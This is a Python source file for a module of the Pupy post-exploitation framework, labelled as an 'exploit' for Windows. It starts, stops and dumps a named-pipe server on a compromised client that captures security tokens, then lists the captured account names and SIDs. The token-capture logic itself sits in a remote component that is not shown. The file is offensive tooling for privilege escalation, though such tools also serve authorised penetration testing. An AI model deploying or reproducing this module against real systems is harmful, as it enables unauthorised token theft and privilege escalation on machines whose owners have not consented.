# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.PupyOutput import List

CATCHER_EVENT = 0x11000003

__class_name__ = 'PipeCatcher'
__events__ = {
    CATCHER_EVENT: 'pipecatcher'
}


@config(compat="windows", category='exploit')
class PipeCatcher(PupyModule):
    'Collect security tokens from pipe server (\\\\.\\pipe\\catcher)'

    unique_instance = True

    dependencies = {
        'windows': ['pipecatcher']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(
            prog='pipecatcher', description=cls.__doc__)

        cls.arg_parser.add_argument(
            'action', choices=['start', 'stop', 'dump']
        )

    def run(self, args):
        if args.action == 'start':
            catcher_start = self.client.remote(
                'pipecatcher', 'catcher_start', False)
            if catcher_start(CATCHER_EVENT):
                self.success('PipeCatcher started')
            else:
                self.error('PipeCatcher already started')

        elif args.action == 'dump':
            catcher_dump = self.client.remote('pipecatcher', 'catcher_dump')
            data = catcher_dump()
            if data is None:
                self.error('PipeCatcher is not running')
            elif not data:
                self.warning('No data')
            else:
                data = [
                    '{} ({})'.format(name, sid) if name != sid
                    else sid for (name, sid) in data
                ]
                self.log(List(data))

        elif args.action == 'stop':
            catcher_stop = self.client.remote(
                'pipecatcher', 'catcher_stop', False)
            catcher_stop()
            self.success('PipeCatcher stopped')

    def stop_daemon(self):
        self.success('PipeCatcher stopped')
